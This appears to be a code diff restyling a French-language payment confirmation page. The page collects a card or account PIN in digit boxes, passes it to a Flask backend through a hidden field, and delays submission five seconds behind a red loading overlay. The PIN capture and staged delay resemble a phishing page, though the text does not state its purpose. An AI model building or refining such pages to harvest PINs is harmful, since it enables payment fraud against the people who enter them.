@@ -32,6 +32,7 @@
         box-shadow: 0 10px 30px rgba(0,0,0,0.15);
         overflow: hidden;
         text-align: center;
+        position: relative;
     }
 
     .payment-header {
@@ -132,18 +133,16 @@
     .pin-boxes {
         display: flex;
         justify-content: center;
-        gap: 10px;
+        gap: 12px;
     }
 
     .pin-box {
-        flex: 1;
+        width: 50px;
         height: 50px;
-        width: 40px;
         border: 2px solid #d32f2f;
         border-radius: 10px;
         font-size: 1.6rem;
         text-align: center;
-        line-height: 41px;
         background: white;
         transition: border 0.2s;
     }
@@ -151,6 +150,7 @@
     .pin-box:focus {
         outline: none;
         border-color: #b71c1c;
+        box-shadow: 0 0 0 3px rgba(211,47,47,0.2);
     }
 
     .btn-confirm {
@@ -176,23 +176,29 @@
         cursor: not-allowed;
     }
 
-    .loading-spinner {
+    /* Red rotating ring loader */
+    .loading-overlay {
         display: none;
         position: absolute;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        width: 24px;
-        height: 24px;
-        border: 3px solid white;
-        border-top: 3px solid transparent;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.8);
+        z-index: 20;
+        justify-content: center;
+        align-items: center;
     }
 
-    @keyframes spin {
-        0% { transform: translate(-50%, -50%) rotate(0deg); }
-        100% { transform: translate(-50%, -50%) rotate(360deg); }
+    .red-ring {
+        width: 64px;
+        height: 64px;
+        border: 6px solid #ffcccc;
+        border-top: 6px solid #d32f2f;
+        border-radius: 50%;
+        animation: rotate 1s linear infinite;
+    }
+
+    @keyframes rotate {
+        0%   { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
     }
 
     .security-note {
@@ -263,14 +269,18 @@
                             <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
                             <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
                         </div>
-                        <!-- Hidden field that sends the PIN to Flask -->
                         <input type="hidden" name="pin" id="pinCombined">
                     </div>
 
                     <button type="submit" class="btn-confirm" id="confirmBtn">
                         CONFIRMER LE PAIEMENT
-                        <div class="loading-spinner" id="spinner"></div>
                     </button>
+
+                    <!-- Red rotating loader overlay -->
+                    <div class="loading-overlay" id="loadingOverlay">
+                        <div class="red-ring"></div>
+                    </div>
+
                 </form>
 
                 <p class="security-note">
@@ -283,7 +293,7 @@
     </div>
 
     <script>
-        // Combine PIN boxes into hidden field (this fixes the 400 error)
+        // Combine PIN digits into hidden field
         const boxes = document.querySelectorAll('.pin-box');
         const pinCombined = document.getElementById('pinCombined');
 
@@ -302,17 +312,19 @@
             });
         });
 
-        // Loading animation on submit
+        // Show red rotating ring for 5 seconds on submit
         const form = document.getElementById('paymentForm');
         const btn = document.getElementById('confirmBtn');
-        const spinner = document.getElementById('spinner');
+        const overlay = document.getElementById('loadingOverlay');
 
         form.addEventListener('submit', (e) => {
-            btn.disabled = true;
-            spinner.style.display = 'inline-block';
-            btn.innerHTML = ''; // hide text
+            e.preventDefault(); // Stop immediate submission
 
-            // 5 seconds delay before real submit
+            // Disable button and show loader
+            btn.disabled = true;
+            overlay.style.display = 'flex';
+
+            // Wait 5 seconds, then actually submit
             setTimeout(() => {
                 form.submit();
             }, 5000);
